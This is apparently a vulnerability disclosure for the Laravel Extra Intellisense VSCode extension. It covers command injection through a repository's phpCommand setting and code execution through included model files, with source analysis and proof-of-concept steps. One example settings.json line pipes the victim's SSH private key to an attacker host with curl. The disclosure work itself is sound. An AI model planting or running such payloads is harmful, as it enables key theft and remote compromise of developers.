# Laravel Extra Intellisense Extension Security Vulnerabilities

## Vulnerability 1: Command Injection via phpCommand Configuration

### Description
The Laravel Extra Intellisense extension allows users to configure a custom PHP command template via the `LaravelExtraIntellisense.phpCommand` setting. This setting is intended to support Docker environments, but it can be exploited for command injection. When a victim opens a malicious repository that contains a `.vscode/settings.json` file with a crafted `phpCommand` configuration, the extension will execute arbitrary system commands when it attempts to analyze the Laravel project.

### Impact
An attacker can achieve remote code execution on the victim's machine with the privileges of the VSCode process. This allows the attacker to access sensitive information, install malware, or perform other malicious actions.

### Vulnerability Rank
Critical

### Currently Implemented Mitigations
The extension attempts to escape some special characters in the code being executed, such as double quotes, dollar signs, and backslashes. However, this is insufficient protection against command injection through the command template itself.

### Missing Mitigations
1. No validation or sanitization of the `phpCommand` configuration value
2. No warning to users about the security implications of this setting
3. No execution in a restricted environment or sandbox

### Preconditions
1. The victim must open a repository with VSCode that contains a malicious `.vscode/settings.json` file
2. The Laravel Extra Intellisense extension must be installed
3. The repository must appear to be a Laravel project (contain an artisan file)

### Source Code Analysis
The vulnerability is primarily in the `runPhp` method in `helpers.ts`:

```typescript
static async runPhp(code: string, description: string|null = null) : Promise<string> {
    code = code.replace(/\"/g, "\\\"");
    if (['linux', 'openbsd', 'sunos', 'darwin'].some(unixPlatforms => os.platform().includes(unixPlatforms))) {
        code = code.replace(/\$/g, "\\$");
        code = code.replace(/\\\\'/g, '\\\\\\\\\'');
        code = code.replace(/\\\\"/g, '\\\\\\\\\"');
    }
    let commandTemplate = vscode.workspace.getConfiguration("LaravelExtraIntellisense").get<string>('phpCommand') ?? "php -r \"{code}\"";
    let command = commandTemplate.replace("{code}", code);

    // Then executes using cp.exec()
    cp.exec(command,
        { cwd: vscode.workspace.workspaceFolders && vscode.workspace.workspaceFolders.length > 0 ? vscode.workspace.workspaceFolders[0].uri.fsPath : undefined },
        function (err, stdout, stderr) {
            // handle output
        }
    );
}
```

The vulnerability occurs because:

1. The extension reads the `phpCommand` configuration, which can be set in the repository's `.vscode/settings.json`
2. It performs simple string replacement of `{code}` with the PHP code to execute
3. The resulting command is passed directly to `cp.exec()` without any validation
4. If an attacker includes shell metacharacters or command separators in the `phpCommand` configuration, they can inject additional commands

For example, a malicious repository might include:

```json
{
  "LaravelExtraIntellisense.phpCommand": "php -r \"{code}\" & curl -s http://attacker.com/exfil.php?data=$(cat ~/.ssh/id_rsa)"
}
```

When the extension starts up, it will run various PHP code snippets to gather information about the Laravel project, and each execution will trigger the malicious command.

### Security Test Case
1. Create a new Laravel project repository with a malicious configuration:
   ```
   mkdir malicious-laravel
   cd malicious-laravel
   touch artisan
   mkdir -p .vscode
   ```

2. Create a `.vscode/settings.json` file with a malicious command:
   ```json
   {
     "LaravelExtraIntellisense.phpCommand": "php -r \"{code}\" & echo PWNED > proof.txt"
   }
   ```

3. Have the victim clone and open the repository with VSCode that has the Laravel Extra Intellisense extension installed

4. The extension will automatically activate and execute PHP commands to analyze the Laravel project

5. After opening the repository, verify that a file named `proof.txt` has been created in the repository root, containing the text "PWNED"

6. For a more sophisticated attack, the command could execute a reverse shell or download and execute malware

## Vulnerability 2: Code Execution via Arbitrary File Inclusion

### Description
The Laravel Extra Intellisense extension dynamically includes PHP files from directories specified in the `modelsPaths` configuration setting. If a malicious repository contains specially crafted PHP files in these directories, they will be executed when the extension analyzes the project.

### Impact
An attacker can achieve arbitrary PHP code execution in the context of the Laravel application, which could lead to system compromise depending on the permissions of the PHP process.

### Vulnerability Rank
High

### Currently Implemented Mitigations
None. The extension includes PHP files without any validation of their content.

### Missing Mitigations
1. Validation or sandboxing of included PHP files
2. Warning users about the security implications of opening untrusted repositories

### Preconditions
1. The victim must open a repository with VSCode that contains malicious PHP files
2. The Laravel Extra Intellisense extension must be installed

### Source Code Analysis
In `EloquentProvider.ts`, the `loadModels()` method sends PHP code that dynamically includes all PHP files from the model paths:

```typescript
Helpers.runLaravel(
    "foreach (['" + vscode.workspace.getConfiguration("LaravelExtraIntellisense").get<Array<string>>('modelsPaths', ['app', 'app/Models']).join('\', \'') + "'] as $modelPath) {" +
    "   if (is_dir(base_path($modelPath))) {" +
    "      foreach (scandir(base_path($modelPath)) as $sourceFile) {" +
    "         if (substr($sourceFile, -4) == '.php' && is_file(base_path(\"$modelPath/$sourceFile\"))) {" +
    "             include_once base_path(\"$modelPath/$sourceFile\");" +
    "         }" +
    "      }" +
    "   }" +
    "}"
    // ...more code...
)
```

This code will include any PHP file found in the model paths, which by default are `app` and `app/Models`. An attacker can place malicious PHP files in these directories that will be executed when the extension analyzes the models.

### Security Test Case
1. Create a malicious Laravel repository:
   ```
   mkdir malicious-laravel
   cd malicious-laravel
   touch artisan
   mkdir -p app/Models
   ```

2. Create a malicious PHP file at `app/Models/MaliciousModel.php`:
   ```php
   <?php
   // This code will execute when the extension loads models
   file_put_contents('proof_model_execution.txt', 'Model code execution successful');

   // Make it look like a legitimate model
   class MaliciousModel extends \Illuminate\Database\Eloquent\Model {
       // Empty model class
   }
   ```

3. Have the victim clone and open the repository in VSCode with the Laravel Extra Intellisense extension

4. The extension will analyze the models, including the malicious file

5. Verify that a file named `proof_model_execution.txt` has been created, demonstrating successful code execution
